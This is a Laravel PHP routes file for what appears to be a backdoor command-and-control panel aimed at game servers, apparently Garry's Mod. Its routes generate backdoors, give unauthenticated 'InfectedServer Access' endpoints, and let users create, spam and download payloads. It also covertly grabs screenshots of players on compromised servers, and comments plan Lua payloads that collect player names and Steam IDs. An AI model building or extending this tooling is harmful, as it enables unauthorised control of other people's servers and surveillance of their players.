<?php


use App\Http\Controllers\kermini\special\imagesController;
use App\Http\Controllers\kermini\special\IpBlocker;
use App\Http\Controllers\kermini\special\screenGrabber;
use App\Http\Controllers\kermini\userLogic;
use App\Http\Controllers\userModify;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

//LANDING PAGE
Route::get('/', function () {
    return view('welcome');
});

//USER PAGES
Route::get('/dashboard/{pageid?}', [userLogic::class, 'dashboard'])->middleware(['auth'])->name('dashboard');

Route::group(['prefix' => 'settings', 'middleware' => ['auth']], function(){
    Route::get('/menu', [userModify::class, 'userMenu'])->name('usermenu');
    Route::post('/menu/edit', [userModify::class, 'userModify'])->name('usermenuedit'); //recaptcha implemented
});

Route::get('/user/{id}', [userLogic::class, 'showUserProfile'])->middleware(['auth'])->name('showUserProfile');

//Backdoor and backdoor setup
Route::get('/backdoor/', [userLogic::class, 'getbackdoor'])->middleware(['auth'])->name('seeBackdoor');
Route::get('/backdoor/regen', [userLogic::class, 'regenbackdoor'])->middleware(['auth'])->name('regenBackdoor');

//InfectedServer Access
Route::get('/kdrm/{key}', [userLogic::class, 'serverBamboozleGET'])->name('serverBackdoorget');
Route::post('/kdrm/{key}', [userLogic::class, 'serverBamboozle'])->name('serverBackdoorpost'); //no need for recaptcha

Route::group(['prefix' => 'payload', 'middleware' => ['auth']], function(){
    Route::get('/dashboard/{pageid?}', [userLogic::class, 'userPayloads'])->name('userPayloads');
    Route::post('/send/', [userLogic::class, 'sendPayload'])->name('sendPayload'); //no captcha needed, allows spamming of payloads

    Route::group(['prefix' => 'new'], function(){
        Route::get('/', [userLogic::class, 'newPayload'])->name('addNewPayload');
        Route::post('/post/', [userLogic::class, 'newPayloadPost'])->name('addNewPayloadPost'); //recaptcha implemented
    });

    Route::group(['prefix' => 'edit'], function(){
        Route::get('/{payloadid}', [userLogic::class, 'editPayload'])->name('editPayload');
        Route::post('/post/', [userLogic::class, 'editPayloadPost'])->name('editPayloadPost'); //recaptcha implemented
    });

    Route::get('/delete/{payloadid}', [userLogic::class, 'deletePayload'])->name('deletePayload');

    Route::get('/global/{pageid?}', [userLogic::class, 'GlobalPayloads'])->name('U-GlobalPayloads');
    Route::post('/global/download', [userLogic::class, 'DownloadGlobalPayload'])->name('DownloadGlobalPayload');

});

//show server details
Route::get('/server/{serverid}', [userLogic::class, 'displayServerDetails'])->name('ServerDetails');

Route::get('/delete/{serverid}', [userLogic::class, 'deleteServer'])->name('ServerDeletion');

Route::group(['prefix' => 'scrgrb', 'middleware' => ['auth']], function(){
    //Print selection page for both methods
    Route::get('/{serverid}', [screenGrabber::class, 'getSelectionMenu'])->name('scrgbMenu');

    //Print selection page for fast Screen Grab
    Route::get('/fast/{serverid}', [screenGrabber::class, 'selectFast'])->name('selectFast');
    //Print selection page for Precise Screen Grab
    Route::get('/precise/{serverid}', [screenGrabber::class, 'selectPrecise'])->name('selectPrecise');
        Route::post('/savePRequest/{rkey}/', [screenGrabber::class, 'savePlayerRequest'])->name('Pscrgrb_player_request')->withoutMiddleware('auth'); //save server response
        Route::post('/pscrgb/{serverid}', [screenGrabber::class, 'sendPrecise'])->name('sendPreciseSCRGBPayload');
        //If the server is online (verify using the source query extension) display the last f_s_c_r_g_r_b_player_requests valid with usage = 0 and (actual time - request created_at) <= valid for seconds,
        //so it should display a list of players with their name AND steamid. And when printing the page set the usage to 1
        //If no f_s_c_r_g_r_b_player_requests is valid for the server and the requesting user initiate following process
        //We need to first launch a request to the server with the payload system using the same logic as fscrgrb to ask the server for a list of
        //players with their steam id, so probably creating in lua a custom table then using https://wiki.facepunch.com/gmod/util.TableToJSON
        //we need to register the result in f_s_c_r_g_r_b_player_requests, if no market system is implemented default validity time should be 20minutes
        //Sending the final payload and saving the image should follow the same logic as fscrgrb, player selection in the lua payload will however change to use the steamid


    //Fast screen grab routes, handling the request of a fast screen-grab and player scrgb lua code request
    Route::post('/fscrgb/{serverid}', [screenGrabber::class, 'sendFast'])->name('sendFastSCRGBPayload');
    Route::get('/faGeCo/{key}', [screenGrabber::class, 'getfCode'])->name('getFastCode')->withoutMiddleware('auth');

});

Route::group(['prefix' => 'images', 'middleware' => ['auth']], function(){
    Route::get('/{pageid?}', [imagesController::class, 'showImages'])->name('showImages');

    Route::post('/post', [imagesController::class, 'postImage'])->name('postImage');
    Route::get('/delete/{imageid}', [imagesController::class, 'deleteImage'])->name('deleteImage');

    //Screen grab inserter
    Route::post('/scrgrb/{imagekey}/', [imagesController::class, 'saveScreenGrab'])->name('saveScreenGrab')->withoutMiddleware('auth');
});

Route::group(['prefix' => 'block'], function(){
    Route::get('/all/{pageid?}', [IpBlocker::class, 'UserBlockedIps'])->name('UserBlockedIps');

    Route::post('/new', [IpBlocker::class, 'UserPostNew'])->name('UserPostNew');

    Route::get('/edit/{restriction}', [IpBlocker::class, 'UserEditRestriction'])->name('UserEditRestriction');
    Route::post('/edit/{restriction}', [IpBlocker::class, 'UserEditRestrictionPost'])->name('UserEditRestrictionPost');

    Route::get('/delete/{restriction}', [IpBlocker::class, 'UserDeleteRestriction'])->name('UserDeleteRestriction');
});

require __DIR__.'/auth.php';
